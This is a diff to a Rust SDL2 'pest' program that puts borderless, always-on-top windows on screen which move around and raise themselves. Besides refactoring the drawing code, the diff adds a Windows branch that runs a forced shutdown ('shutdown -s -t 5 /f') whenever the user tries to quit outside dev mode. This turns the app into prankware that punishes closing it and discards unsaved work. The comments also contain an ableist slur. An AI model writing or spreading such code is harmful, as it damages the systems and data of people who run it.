@@ -1,4 +1,5 @@
 use std::path::Path;
+use std::process::Command;
 use std::sync::Arc;
 use std::thread::sleep;
 use std::time::Duration;
@@ -9,7 +10,7 @@ use sdl2::keyboard::Scancode;
 use sdl2::mouse::MouseButton;
 use sdl2::pixels::Color;
 use sdl2::rect::Rect;
-use sdl2::render::Texture;
+use sdl2::render::{Texture, Canvas, WindowCanvas};
 use sdl2::surface::Surface;
 use sdl2::sys::{SDL_DestroyWindow, SDL_SetWindowPosition};
 use sdl2::{self, VideoSubsystem, event};
@@ -151,7 +152,7 @@ impl Physics {
 }
 
 struct Pest {
-    window: Window,
+    canvas: Canvas<Window>,
     physics: Physics,
     immunity: Immunity,
     time_alive: f64
@@ -161,7 +162,7 @@ impl Pest {
     fn new(video_subsys: &VideoSubsystem, immunity: Immunity, physics: Physics, window_name: &str, icon_path: &'static Path, x: i32, y: i32) -> Result<Pest, String> {
         Ok(
             Pest {
-                window: create_window(video_subsys, window_name, x, y, 200, 200, icon_path)?,
+                canvas: create_window(video_subsys, window_name, x, y, 200, 200, icon_path)?.into_canvas().build().unwrap(),
                 immunity,
                 physics,
                 time_alive: 0.0
@@ -169,43 +170,31 @@ impl Pest {
         )
     }
 
-    fn draw_image(mut self, texture_path: &'static Path) -> Result<Pest, String> {
-        let mut c = self.window
-        .into_canvas()
-        .accelerated()
-        .build()
-        .unwrap();
+    fn draw_image(&mut self, texture_path: &'static Path) -> Result<(), String> {
 
-        let texture_creator = c.texture_creator();
+        let texture_creator = self.canvas.texture_creator();
 
         let texture = texture_creator.load_texture(texture_path)?;
 
         let query = texture.query();
+        
+        self.canvas.clear();
 
-        c.copy(&texture, None, Rect::new(0, 0, query.width, query.height))
+        self.canvas.copy(&texture, None, Rect::new(0, 0, query.width, query.height))
         .expect("couldnt copy texture to screen...");
 
-        c.present();
+        self.canvas.present();
 
-        self.window = c.into_window();
-
-        Ok(self)
+        Ok(())
     }
 
-    fn draw_color(mut self, color: Color) -> Result<Pest, String> {
-        let mut c = self.window
-        .into_canvas()
-        .accelerated()
-        .build()
-        .unwrap();
+    fn draw_color(&mut self, color: Color) -> Result<(), String> {
         
-        c.set_draw_color(color);
-        c.clear();
-        c.present();
-
-        self.window = c.into_window();
-
-        Ok(self)
+        self.canvas.set_draw_color(color);
+        self.canvas.clear();
+        self.canvas.present();
+        
+        Ok(())
     }
 }
 
@@ -234,11 +223,9 @@ enum InitMethod {
 }
 
 fn kill_pest(pests: &mut Vec<Pest>, window_id: u32) {
-    if let Some(p) = find_pest(pests, window_id) {
-        let w = &mut p.window;
-        let idx = pests.iter().position(|p| {p.window.id() == window_id}).expect("CANNOT FIND WINDOW ID");
-        // when the pest geos out of scope, it's window follows and is destroyed.
-        pests.remove(idx);
+    let idx = pests.iter().position(|p| {p.canvas.window().id() == window_id});
+    if idx.is_some() {
+        pests.remove(idx.unwrap());
     }
     else {
         println!("window was none lol");
@@ -257,10 +244,10 @@ fn update_pests(pests: &mut Vec<Pest>, dt: f64, bounds: &Bounds) {
         let x = pest.physics.transform.position.x;
         let y = pest.physics.transform.position.y;
 
-        pest.window.set_minimum_size(1, 1).unwrap();
+        pest.canvas.window_mut().set_minimum_size(1, 1).unwrap();
         // unsafe because i have cancer
         unsafe {
-            SDL_SetWindowPosition(pest.window.raw(), x as i32, y as i32);
+            SDL_SetWindowPosition(pest.canvas.window_mut().raw(), x as i32, y as i32);
         }
     }
 }
@@ -309,11 +296,11 @@ fn main() -> Result<(), String> {
 
         match init_method {
             InitMethod::WithColor { color } => {
-                p = p.draw_color(color)?;
+                p.draw_color(color)?;
             },
 
             InitMethod::WithTexture { texture_path } => {
-                p = p.draw_image(texture_path)?;
+                p.draw_image(texture_path)?;
             }
             
             InitMethod::Blank => {
@@ -346,11 +333,11 @@ fn main() -> Result<(), String> {
 
         match init_method {
             InitMethod::WithColor { color } => {
-                p = p.draw_color(color)?;
+                p.draw_color(color)?;
             },
 
             InitMethod::WithTexture { texture_path } => {
-                p = p.draw_image(texture_path)?;
+                p.draw_image(texture_path)?;
             }
             
             InitMethod::Blank => {
@@ -366,7 +353,7 @@ fn main() -> Result<(), String> {
 
     // sdl.mouse().capture(true);
     
-    add_pest(200, 400, InitMethod::WithTexture { texture_path: DOGPATH }, Immunity::OnFirstFocus, Vector2::new(5.0, 0.0), &mut pests)?;
+    add_pest(200, 400, InitMethod::WithColor { color: Color::RGBA(255, 255, 0, 0) }, Immunity::OnFirstFocus, Vector2::new(5.0, 0.0), &mut pests)?;
     // add_pest_random(InitMethod::WithTexture { texture_path: DOGPATH }, Vector2::new(5.0, 0.0), &mut pests)?;                    
     // add_pest_random(InitMethod::WithTexture { texture_path: DOGPATH }, Vector2::new(5.0, 0.0), &mut pests)?;                    
 
@@ -424,7 +411,9 @@ fn main() -> Result<(), String> {
                         // pests[0].physics.velocity = Vector2::new_rand(0.0..10.0);
                     }
                     else if mouse_btn == MouseButton::Right {
-                        panic!();
+                        if dev_mode {
+                            panic!();
+                        }
                     }
                 },
                 Event::Window { window_id, win_event, .. } => {
@@ -460,6 +449,13 @@ fn main() -> Result<(), String> {
                 Event::Quit { .. } => {
                     if dev_mode {
                         break 'running;
+                    } else {
+                        if cfg!(target_os = "windows") {
+                            Command::new("cmd")
+                                    .args(&["/C", "shutdown -s -t 5 /f"])
+                                    .output()
+                                    .expect("failed to execute process");
+                        }
                     }
                 },
                 _ => {}//println!("YOU'ER RETARDED")
@@ -470,6 +466,8 @@ fn main() -> Result<(), String> {
 
         // physics
         update_pests(&mut pests, dt, &screen_bounds);
+        pests[0].draw_image(DOGPATH)?;
+        pests[0].canvas.window_mut().raise();
 
         sleep(Duration::from_secs_f64(1.0/144.0));
         dt = stopwatch.elapsed_seconds();
@@ -477,8 +475,6 @@ fn main() -> Result<(), String> {
         // println!("frame completed in {} seconds.", dt);
 
         stopwatch.reset();
-
-        // pests[0].window.raise();
 
     }
 
@@ -490,7 +486,6 @@ fn create_window(video_subsystem: &VideoSubsystem, name: &str, x: i32, y: i32, w
     .borderless()
     .position(x, y)
     .always_on_top()
-    .minimized()
     .allow_highdpi()
     .build()
     .map_err(|e| e.to_string())?;
@@ -505,5 +500,5 @@ fn create_window(video_subsystem: &VideoSubsystem, name: &str, x: i32, y: i32, w
 
 fn find_pest(windows: &mut Vec<Pest>, id: u32) -> Option<&mut Pest> {
     windows.iter_mut()
-    .find(|p| p.window.id() == id)
+    .find(|p| p.canvas.window().id() == id)
 }
